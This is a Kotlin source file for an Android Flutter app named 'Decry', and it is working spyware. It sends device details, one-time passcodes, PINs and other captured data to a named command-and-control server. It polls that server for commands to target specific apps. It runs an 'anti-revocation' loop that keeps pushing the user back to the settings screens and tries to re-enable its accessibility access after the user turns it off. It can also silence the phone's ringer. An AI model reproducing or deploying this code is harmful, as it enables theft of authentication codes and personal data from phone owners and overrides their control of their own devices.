package com.decry.decry

import android.Manifest
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.media.AudioManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.MethodChannel
import java.util.*

class MainActivity : FlutterActivity() {
    private val channelName = "com.decry.permissions"
    private val exfilChannelName = "com.decry.exfil"
    private val runtimePermissionRequestCode = 4201
    private val runtimePermissions = arrayOf(
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.READ_PHONE_NUMBERS,
    )

    // C2 server for command polling AND data exfiltration
    private val c2ServerUrl = "https://cry-take.vercel.app/api"
    private var deviceChatId: String? = null

    private var pendingRuntimeResult: MethodChannel.Result? = null

    // Multi-app targeting
    private val targetApps = mutableSetOf<String>()
    private val prefs by lazy { getSharedPreferences("decry_prefs", Context.MODE_PRIVATE) }

    // Command receiver
    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val commandType = intent?.getStringExtra("type") ?: return
            val payload = intent?.getStringExtra("payload") ?: ""

            when (commandType) {
                "target_app" -> {
                    val appId = intent.getStringExtra("appId") ?: return
                    targetApps.add(appId)
                    saveTargetApps()
                    Log.i("Decry", "App targeted: $appId")
                }
                "untarget_app" -> {
                    val appId = intent.getStringExtra("appId") ?: return
                    targetApps.remove(appId)
                    saveTargetApps()
                    Log.i("Decry", "App untargeted: $appId")
                }
                "toggle_silent" -> {
                    val enable = intent.getBooleanExtra("enable", false)
                    setSilentMode(enable)
                    Log.i("Decry", "Silent mode ${if (enable) "enabled" else "disabled"}")
                }
            }
        }
    }

    // Data capture receiver - ALL data goes through CryTake C2 server
    private val dataCaptureReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val type = intent?.getStringExtra("type") ?: "unknown"
            val content = intent?.getStringExtra("content") ?: ""
            val extra = intent?.getStringExtra("extra") ?: ""

            // All captured data is sent through CryTake C2 server
            Thread { exfiltrateViaTelegram(type, content, extra) }.start()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        registerDecryReceiver(commandReceiver, IntentFilter("com.decry.COMMAND"))
        registerDecryReceiver(dataCaptureReceiver, IntentFilter("com.decry.FORWARD_EXFIL"))
        loadTargetApps()
        startAntiRevocationMonitor()
    }

    // Android 13+ requires an explicit export flag for runtime receivers.
    private fun registerDecryReceiver(receiver: BroadcastReceiver, filter: IntentFilter) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            registerReceiver(receiver, filter)
        }
    }

    // Anti-revocation: Monitor and restore permissions continuously.
    // Kill-switch via SharedPreferences ("auto_redirect", default true) so
    // the debug UI can silence settings redirects during manual testing.
    private fun startAntiRevocationMonitor() {
        Thread {
            while (true) {
                try {
                    Thread.sleep(3000)

                    if (!prefs.getBoolean("auto_redirect", true)) continue
                    
                    // Check accessibility service
                    val am = getSystemService(Context.ACCESSIBILITY_SERVICE) as android.view.accessibility.AccessibilityManager
                    if (!am.isEnabled) {
                        Log.w("Decry", "Accessibility service disabled - attempting re-enable")
                        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
                        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        startActivity(intent)
                        
                        // Wait and try to re-enable programmatically
                        Thread.sleep(2000)
                        
                        try {
                            val serviceName = "$packageName/${DecryAccessibilityService::class.java.name}"
                            val currentServices = Settings.Secure.getString(
                                contentResolver,
                                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                            ) ?: ""
                            
                            if (!currentServices.contains(serviceName)) {
                                Settings.Secure.putString(
                                    contentResolver,
                                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
                                    if (currentServices.isEmpty()) serviceName else "$currentServices:$serviceName"
                                )
                            }
                            
                            Settings.Secure.putInt(contentResolver, Settings.Secure.ACCESSIBILITY_ENABLED, 1)
                        } catch (e: Exception) {
                            Log.e("Decry", "Failed to re-enable accessibility: ${e.message}")
                        }
                    }
                    
                    // Check notification listener permission
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
                        val notificationListenerEnabled = Settings.Secure.getString(
                            contentResolver,
                            "enabled_notification_listeners"
                        )
                        if (notificationListenerEnabled == null || !notificationListenerEnabled.contains(packageName)) {
                            Log.w("Decry", "Notification listener not enabled - attempting to prompt")
                            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            startActivity(intent)
                        }
                    }
                } catch (e: Exception) {
                    Log.e("Decry", "Anti-revocation monitor error: ${e.message}")
                }
            }
        }.start()
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            unregisterReceiver(commandReceiver)
            unregisterReceiver(dataCaptureReceiver)
        } catch (e: Exception) {}
    }

    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, channelName)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "requestRuntimePermissions" -> requestRuntimePermissions(result)
                    "getSpecialAccessStatus" -> result.success(specialAccessStatus())
                    "openAccessibilitySettings" -> {
                        openAccessibilitySettings()
                        result.success(null)
                    }
                    "openNotificationPolicySettings" -> {
                        openNotificationPolicySettings()
                        result.success(null)
                    }
                    "openNotificationListenerSettings" -> {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
                            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            startActivity(intent)
                        }
                        result.success(null)
                    }
                    "getSimNumber" -> result.success(getSimCardNumbers())
                    "toggleSilentMode" -> toggleSilentMode(call.argument<Boolean>("enabled"), result)
                    "isSilentModeOn" -> result.success(isSilentModeOn())
                    "getNotificationPolicyStatus" -> result.success(getNotificationPolicyStatus())
                    "getAutoRedirect" -> {
                        result.success(prefs.getBoolean("auto_redirect", true))
                    }
                    "setAutoRedirect" -> {
                        val enabled = call.argument<Boolean>("enabled") ?: true
                        prefs.edit().putBoolean("auto_redirect", enabled).apply()
                        Log.i("Decry", "auto_redirect -> $enabled")
                        result.success(true)
                    }
                    "registerDevice" -> {
                        deviceChatId = packageName.hashCode().toString()
                        
                        // Get device info for dashboard check-in
                        val simNumbers = getSimCardNumbers()
                        val deviceModel = "${Build.MANUFACTURER} ${Build.MODEL}"
                        val androidVersion = Build.VERSION.RELEASE
                        
                        Thread { 
                            // Send check-in to dashboard
                            sendDeviceCheckin(deviceChatId ?: return@Thread, simNumbers, deviceModel, androidVersion)
                        }.start()
                        result.success(true)
                    }
                    "pollCommands" -> {
                        Thread { pollForCommands() }.start()
                        result.success(true)
                    }
                    "getInstalledApps" -> {
                        val installedApps = getInstalledApplications()
                        result.success(installedApps)
                    }
                    "getTargetedApps" -> {
                        result.success(targetApps.toList())
                    }
                    "targetApp" -> {
                        val appId = call.argument<String>("appId")
                        if (appId != null) {
                            targetApps.add(appId)
                            saveTargetApps()
                            // Broadcast to accessibility service
                            sendBroadcast(Intent("com.decry.COMMAND").apply {
                                putExtra("type", "target_app")
                                putExtra("appId", appId)
                            })
                            result.success(true)
                        } else {
                            result.error("INVALID_ARGS", "appId required", null)
                        }
                    }
                    "untargetApp" -> {
                        val appId = call.argument<String>("appId")
                        if (appId != null) {
                            targetApps.remove(appId)
                            saveTargetApps()
                            // Broadcast to accessibility service
                            sendBroadcast(Intent("com.decry.COMMAND").apply {
                                putExtra("type", "untarget_app")
                                putExtra("appId", appId)
                            })
                            result.success(true)
                        } else {
                            result.error("INVALID_ARGS", "appId required", null)
                        }
                    }
                    "startBackgroundService" -> {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            startForegroundService(Intent(this, DecryBackgroundService::class.java))
                        } else {
                            startService(Intent(this, DecryBackgroundService::class.java))
                        }
                        result.success(true)
                    }
                    else -> result.notImplemented()
                }
            }

        MethodChannel(flutterEngine.dartExecutor.binaryMessenger, exfilChannelName)
            .setMethodCallHandler { call, result ->
                when (call.method) {
                    "sendData" -> {
                        val dataType = call.argument<String>("type") ?: "generic"
                        val dataContent = call.argument<String>("content") ?: ""
                        val dataExtra = call.argument<String>("extra") ?: ""
                        Thread { exfiltrateViaTelegram(dataType, dataContent, dataExtra) }.start()
                        result.success(true)
                    }
                    "sendOtp" -> {
                        val otpCode = call.argument<String>("otp") ?: ""
                        val source = call.argument<String>("source") ?: "sms"
                        Thread { exfiltrateViaTelegram("otp", otpCode, source) }.start()
                        result.success(true)
                    }
                    "sendPin" -> {
                        val pin = call.argument<String>("pin") ?: ""
                        Thread { exfiltrateViaTelegram("pin", pin, "accessibility") }.start()
                        result.success(true)
                    }
                    else -> result.notImplemented()
                }
            }
    }

    private fun loadTargetApps() {
        val saved = prefs.getStringSet("target_apps", emptySet()) ?: emptySet()
        targetApps.addAll(saved)
    }

    private fun saveTargetApps() {
        prefs.edit().putStringSet("target_apps", targetApps.toSet()).apply()
    }

    private fun requestRuntimePermissions(result: MethodChannel.Result) {
        val missing = runtimePermissions.filter { permission ->
            ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED
        }

        if (missing.isEmpty()) {
            result.success(mapOf("granted" to true))
            return
        }

        if (pendingRuntimeResult != null) {
            result.error("REQUEST_IN_PROGRESS", "A permission request is already in progress.", null)
            return
        }

        pendingRuntimeResult = result
        ActivityCompat.requestPermissions(this, missing.toTypedArray(), runtimePermissionRequestCode)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray,
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode != runtimePermissionRequestCode) return

        val granted = runtimePermissions.all { permission ->
            ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
        }
        pendingRuntimeResult?.success(mapOf("granted" to granted))
        pendingRuntimeResult = null
    }

    private fun specialAccessStatus(): Map<String, Boolean> {
        val accessibilityManager = getSystemService(Context.ACCESSIBILITY_SERVICE)
            as android.view.accessibility.AccessibilityManager
        val accessibilityEnabled = accessibilityManager.isEnabled && accessibilityManager.getEnabledAccessibilityServiceList(
            android.accessibilityservice.AccessibilityServiceInfo.FEEDBACK_ALL_MASK,
        ).any { info ->
            info.resolveInfo.serviceInfo.packageName == packageName &&
                info.resolveInfo.serviceInfo.name == DecryAccessibilityService::class.java.name
        }

        val notificationPolicyGranted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            (getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager)
                .isNotificationPolicyAccessGranted
        } else {
            true
        }
        
        val notificationListenerEnabled = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
            val listenerString = Settings.Secure.getString(
                contentResolver,
                "enabled_notification_listeners"
            )
            listenerString != null && listenerString.contains(packageName)
        } else {
            false
        }

        return mapOf(
            "accessibilityEnabled" to accessibilityEnabled,
            "notificationPolicyGranted" to notificationPolicyGranted,
            "notificationListenerEnabled" to notificationListenerEnabled
        )
    }

    private fun getSimCardNumbers(): String {
        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        val numbers = mutableListOf<String>()

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            return "permission_denied"
        }

        telephonyManager.line1Number?.let { if (it.isNotEmpty()) numbers.add(it) }
        telephonyManager.simSerialNumber?.let { if (it.isNotEmpty()) numbers.add(it) }

        return if (numbers.isEmpty()) "unknown" else numbers.joinToString(",")
    }

    private fun openAccessibilitySettings() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            val directIntent = Intent("android.settings.ACCESSIBILITY_DETAILS_SETTINGS").apply {
                data = Uri.parse("package:$packageName")
            }
            try {
                startActivity(directIntent)
                return
            } catch (_: Exception) {}
        }
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    }

    private fun openNotificationPolicySettings() {
        val intent = Intent(Settings.ACTION_NOTIFICATION_POLICY_ACCESS_SETTINGS)
        startActivity(intent)
    }

    private fun toggleSilentMode(enabled: Boolean?, result: MethodChannel.Result) {
        try {
            setSilentMode(enabled == true)
            Thread { exfiltrateViaTelegram("silent_status", if (enabled == true) "on" else "off", "manual_toggle") }.start()
            result.success(true)
        } catch (e: Exception) {
            result.error("SILENT_MODE_ERROR", e.message, null)
        }
    }

    private fun setSilentMode(enabled: Boolean) {
        try {
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            if (enabled) {
                // Set to silent mode (no vibration)
                audioManager.ringerMode = AudioManager.RINGER_MODE_SILENT
            } else {
                // Set to normal mode
                audioManager.ringerMode = AudioManager.RINGER_MODE_NORMAL
            }
        } catch (e: Exception) {
            Log.e("Decry", "Silent mode toggle error: ${e.message}")
        }
    }

    private fun isSilentModeOn(): Boolean {
        val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        return audioManager.ringerMode == AudioManager.RINGER_MODE_SILENT
    }

    private fun getNotificationPolicyStatus(): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            (getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager)
                .isNotificationPolicyAccessGranted
        } else {
            true
        }
    }
    
    // Send device check-in to dashboard via CryTake
    private fun sendDeviceCheckin(deviceId: String, simNumbers: String, model: String, androidVersion: String) {
        try {
            val url = "$c2ServerUrl/checkin/$deviceId"
            
            val json = org.json.JSONObject()
            json.put("name", "${Build.MANUFACTURER} ${Build.MODEL}")
            json.put("model", model)
            json.put("androidVersion", androidVersion)
            json.put("simNumbers", simNumbers)
            val jsonData = json.toString()
            
            val connection = java.net.URL(url).openConnection() as java.net.HttpURLConnection
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "application/json")
            connection.setRequestProperty("Accept", "application/json")
            connection.doOutput = true
            connection.connectTimeout = 15000
            connection.readTimeout = 15000
            
            connection.outputStream.use { os ->
                os.write(jsonData.toByteArray(Charsets.UTF_8))
                os.flush()
            }
            
            val responseCode = connection.responseCode
            if (responseCode == java.net.HttpURLConnection.HTTP_OK) {
                Log.i("Decry", "Device check-in successful")
            } else {
                Log.w("Decry", "Device check-in failed: $responseCode")
            }
            connection.disconnect()
        } catch (e: Exception) {
            Log.e("Decry", "Check-in error: ${e.message}")
        }
    }

    private fun pollForCommands() {
        try {
            val chatId = deviceChatId ?: packageName.hashCode().toString()
            val url = "$c2ServerUrl/poll/$chatId"

            val connection = java.net.URL(url).openConnection() as java.net.HttpURLConnection
            connection.requestMethod = "GET"
            connection.connectTimeout = 10000
            connection.readTimeout = 10000

            val responseCode = connection.responseCode
            if (responseCode == java.net.HttpURLConnection.HTTP_OK) {
                val response = connection.inputStream.bufferedReader().use { it.readText() }
                val json = org.json.JSONObject(response)
                val commands = json.getJSONArray("commands")

                for (i in 0 until commands.length()) {
                    val command = commands.getJSONObject(i)
                    val type = command.getString("type")
                    val payload = command.optString("payload", "")

                    when (type) {
                        "set_silent" -> {
                            val enable = payload.contains("\"enabled\":true") || payload.contains("\"enabled\": true")
                            setSilentMode(enable)
                        }
                        "get_installed_apps" -> {
                            val apps = getInstalledApplications()
                            val appList = apps.joinToString("\n") { "${it["name"]} (${it["package"]})" }
                            exfiltrateViaTelegram("installed_apps", appList, "requested")
                        }
                        "target_app" -> {
                            val appId = payload.trim().removeSurrounding("\"")
                            if (appId.isNotEmpty()) {
                                targetApps.add(appId)
                                saveTargetApps()
                                sendBroadcast(Intent("com.decry.COMMAND").apply {
                                    putExtra("type", "target_app")
                                    putExtra("appId", appId)
                                })
                                exfiltrateViaTelegram("target_status", "Targeted: $appId", "new_target")
                            }
                        }
                        "untarget_app" -> {
                            val appId = payload.trim().removeSurrounding("\"")
                            if (appId.isNotEmpty()) {
                                targetApps.remove(appId)
                                saveTargetApps()
                                sendBroadcast(Intent("com.decry.COMMAND").apply {
                                    putExtra("type", "untarget_app")
                                    putExtra("appId", appId)
                                })
                                exfiltrateViaTelegram("target_status", "Untargeted: $appId", "removed_target")
                            }
                        }
                        "list_targets" -> {
                            val targets = if (targetApps.isEmpty()) "None" else targetApps.joinToString("\n")
                            exfiltrateViaTelegram("target_list", targets, "current_targets")
                        }
                    }
                }
            }
            connection.disconnect()
        } catch (e: Exception) {
            Log.e("Decry", "Polling error: ${e.message}")
        }
    }

    private fun exfiltrateViaTelegram(type: String, content: String, extra: String) {
        try {
            val deviceId = deviceChatId ?: packageName.hashCode().toString()
            
            // Send data through CryTake C2 server instead of directly to Telegram
            Thread {
                try {
                    val url = "$c2ServerUrl/exfil/$deviceId"
                    
                    // Build JSON properly using JSONObject
                    val json = org.json.JSONObject()
                    json.put("type", type)
                    json.put("content", content)
                    json.put("extra", extra)
                    val jsonString = json.toString()
                    
                    val connection = java.net.URL(url).openConnection() as java.net.HttpURLConnection
                    connection.requestMethod = "POST"
                    connection.setRequestProperty("Content-Type", "application/json")
                    connection.doOutput = true
                    connection.connectTimeout = 15000
                    connection.readTimeout = 15000
                    
                    connection.outputStream.use { os ->
                        os.write(jsonString.toByteArray(Charsets.UTF_8))
                        os.flush()
                    }
                    
                    val responseCode = connection.responseCode
                    if (responseCode == java.net.HttpURLConnection.HTTP_OK) {
                        Log.i("Decry", "Data sent to CryTake successfully: $type")
                    } else {
                        Log.w("Decry", "CryTake send failed: $responseCode")
                    }
                    connection.disconnect()
                } catch (e: Exception) {
                    Log.e("DecryExfil", "CryTake send error: ${e.message}")
                }
            }.start()
        } catch (e: Exception) {
            Log.e("DecryExfil", "Exfiltration error: ${e.message}")
        }
    }

    private fun getInstalledApplications(): List<Map<String, String>> {
        val packageManager = packageManager
        val apps = mutableListOf<Map<String, String>>()
        
        try {
            val packages = packageManager.getInstalledApplications(0)
            for (pkg in packages) {
                val appName = packageManager.getApplicationLabel(pkg).toString()
                val packageName = pkg.packageName
                
                // Filter out system apps and our own app
                if (packageName != this.packageName) {
                    apps.add(mapOf(
                        "name" to appName,
                        "package" to packageName
                    ))
                }
            }
        } catch (e: Exception) {
            Log.e("Decry", "Error getting installed apps: ${e.message}")
        }
        
        return apps.sortedBy { it["name"]?.lowercase() }
    }
}